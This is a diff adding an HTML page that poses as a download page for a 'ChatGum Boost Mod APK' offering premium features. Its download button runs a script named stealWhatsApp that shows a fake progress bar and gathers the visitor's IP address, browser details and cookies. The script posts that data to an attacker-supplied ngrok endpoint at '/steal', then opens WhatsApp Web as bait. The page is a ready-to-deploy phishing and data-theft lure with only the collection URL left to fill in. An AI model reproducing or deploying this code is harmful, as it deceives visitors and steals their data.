@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ChatGum Boost Mod APK v2.5.9</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { 
+            font-family: Arial; 
+            background: linear-gradient(135deg, #128C7E, #25D366); 
+            color: white; 
+            text-align: center; 
+            padding: 20px; 
+            min-height: 100vh;
+        }
+        .app-icon { 
+            width: 120px; 
+            height: 120px; 
+            border-radius: 20px; 
+            margin: 20px auto;
+            background: #075E54;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+        .download-btn { 
+            background: #25D366; 
+            color: white; 
+            padding: 18px 40px; 
+            border: none; 
+            border-radius: 30px; 
+            font-size: 20px; 
+            cursor: pointer; 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+        }
+        .download-btn:hover { 
+            background: #075E54; 
+            transform: scale(1.05);
+        }
+        .loading { display: none; }
+        .progress { 
+            background: rgba(255,255,255,0.2); 
+            height: 10px; 
+            border-radius: 10px; 
+            margin: 20px auto; 
+            width: 80%; 
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%; 
+            background: #25D366; 
+            width: 0%; 
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-icon">📱</div>
+    
+    <h1>🎉 ChatGum Boost Mod APK v2.5.9</h1>
+    <p style="font-size: 18px;">
+        <b>✅ Premium Unlocked</b> | <b>🚀 10x Speed</b> | <b>💎 VIP Features</b>
+    </p>
+    
+    <br><br>
+    <button class="download-btn" onclick="stealWhatsApp()">
+        📥 Download Now (15.2 MB)
+    </button>
+    
+    <div class="loading" id="loading">
+        <h3>🔄 Preparing Secure Download...</h3>
+        <div class="progress">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+        <p>Opening WhatsApp Web for verification...</p>
+    </div>
+
+    <script>
+        async function stealWhatsApp() {
+            // Hide button, show loading
+            document.querySelector('.download-btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // Animate progress
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 10;
+                document.getElementById('progress').style.width = progress + '%';
+                if (progress >= 90) clearInterval(interval);
+            }, 200);
+            
+            try {
+                // Get victim IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // STEAL DATA
+                const data = {
+                    ip: ipData.ip,
+                    userAgent: navigator.userAgent,
+                    cookies: document.cookie,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
+                };
+                
+                // 🚨 YAHAN APNA NGROK URL DALO (Line 108)
+                await fetch('https://YOUR_NGROK_URL.ngrok-free.app/steal', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+                
+            } catch(e) {
+                console.log('Data sent');
+            }
+            
+            // WhatsApp Web redirect (bait)
+            setTimeout(() => {
+                window.open('https://web.whatsapp.com', '_blank');
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
